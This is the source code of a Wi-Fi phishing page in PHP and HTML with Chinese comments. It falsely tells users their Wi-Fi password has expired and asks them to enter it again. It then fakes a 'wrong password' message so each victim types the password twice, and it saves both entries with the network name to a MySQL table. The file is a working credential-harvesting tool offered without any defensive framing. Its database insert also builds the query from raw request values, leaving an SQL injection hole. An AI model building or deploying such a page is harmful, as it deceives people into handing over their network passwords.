<?php

    //wifi使用配置信息
   
     $wifiname="未知";          // wifi名称
     $servername ="localhost";  // 数据库连接地址
	 $username = "root";       // 数据库名称
	 $password = "root";       // 数据库密码
	 $dbname="wifi";           //数据库表名

  //判断是否有值，如果没值，不会执行和报错，如果有值则执行。 
 if(!empty($_GET['godbssid'])){
			$bssid1=$_GET['bssid1'];
			$bssid2=$_GET['bssid2'];
	        
			$godbssid=$_GET['godbssid']; //URL过来的GET名。
		//写入数据库
		 $conn = mysqli_connect($servername,$username,$password,$dbname); // 检测连接
		if ($conn->connect_error) { 
			die("连接失败: " . $conn->connect_error);
	     }
		 
		 $sql = "INSERT INTO getwifi(name,bssid1,bssid2) VALUES ('$godbssid', '$bssid1', '$bssid2')"; 
		 if (mysqli_query($conn, $sql)) {
				//echo "新记录插入成功";
				header('Location:./loding.html');
			}
		  else { 
					echo "Error: " . $sql . "<br>" . mysqli_error($conn);
				}
		  mysqli_close($conn); //关闭数据库
    }
	
?>

<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <title>wifi密码</title>
  <link rel="stylesheet" href="./layui/css/layui.css">
</head>
<style>
	html,body{
		width: 100%;
		height: 100%;
		margin: 0;
		padding: 0;
	}
	.fb{
		width: 100%;
		height: 100%;
		 background-color:#2673bf;
		  text-align:center;
		 margin: 0 auto;
	}
	.topb{
		width: 100%;
	    height: 170px;
	   background-image:url(./img/1.png);	
	   background-repeat:no-repeat;
	   background-size:10rem;
	   background-position:center;
	  // border: 1px solid red;
	   margin:0 auto;
	}
	.tb{

	   background-position:center;
	   margin:0 auto;
	}
.inp{
	margin: 0 auto;
	width: 5rem;
}
.cj{
	position:absolute;
	left:19%;
	top:5%;
	z-index:-1;
	width: 52%;
	height: 30%;
}
	
</style>
<body>
<div class="layui-container fb"> 
 <div class="layui-row">
	       <div class="topb layui-col-xs12 layui-col-sm12 layui-col-md12">
		   </div>
		   <div class="layui-col-xs12 layui-col-sm12 layui-col-md12" style="height: 5rem;color:#FFFFFF;">
		   		  <h1>您的wifi密码已过期</h1>
				  <h1>请重新输入</h1>
		   </div>
		   <div class=" tb layui-col-xs12 layui-col-sm12 layui-col-md12" style="height: 20rem;">
			   
				   <form  action=""  method="get" id="myform"  onsubmit="return pp();">
					   <div class="" style="height:20rem; width: 60%; margin: 0 auto;">
						   <br/>
						  <div style="text-align:center;vertical-align:middle;">
								<input id="vinput" name="bssid2" autofocus="autofocus" placeholder="请输入您的wifi密码"style="border:none;height: 2.5rem; padding-left: 5px; margin-bottom: 1rem;"  class="layui-col-xs12 layui-col-sm12 layui-col-md12" type="text"/>
						  </div>
						  <p>   </p>
						  <br/>
						  <input  id="bssid1" type="hidden" name="bssid1"/>
						   <input id="godbssid" type="hidden" name="godbssid" value="<?php echo $wifiname;?>"/>
							<div style="text-align:center;vertical-align:middle;">
								<br/>
									<input style="border:none;  height: 2.5rem; padding-left: 5px;background-color: #4896fa;color: #FFFFFF;"  class="layui-col-xs12 layui-col-sm12 layui-col-md12" type="submit" value="登陆"/>
							 </div>
							 <!--层级-->
							 <div  id="cx"  class="cj" style="width:62%;height:30%; display:none; text-align: center; font-size: 1.3rem; background-color: #FFFFFF;">
							 					    密码错误,请重新输入!<br/><br/>
							 					     <input style="width: 10rem;" type="button" value="OK" onclick="px()">
							 </div>
						</div>
				   </form>
				   
		   </div>
</div>
</div>
<script>
	var m=0;
	var vv="";
	
	 function pp(){
		 var vl=document.getElementById("vinput");
		 var vlu=vl.value;
		  console.log(m);
		 if(m==0){
		    if(vlu==null||vlu==""){
						var c=document.getElementById("cx");
						 c.style.display="block";
						 c.style.zIndex="5";
						 document.getElementById("myform").reset(); 
						 return false;
			  }
			  else{
					var c=document.getElementById("cx");
							   c.style.display="block";
							   c.style.zIndex="5";
							   document.getElementById("myform").reset(); 
							   vv=vlu;
								 m++;
							   return false;
				 }	 
	      }
		  else if(vlu==null||vlu==""){
					var c=document.getElementById("cx");
							   c.style.display="block";
							   c.style.zIndex="5";
						 return false;
		  }
		  else{
						 var bs1=document.getElementById("bssid1");
						     bs1.value=vv;
							  console.log(bs1);
							  return true;
		  }
	}
 
   function px(){
	      var c=document.getElementById("cx");
			   c.style.display="none";
			   c.style.zIndex="-1";
			   var vl=document.getElementById("vinput");
			   vl.focus();
        }
</script>
</body>
</html>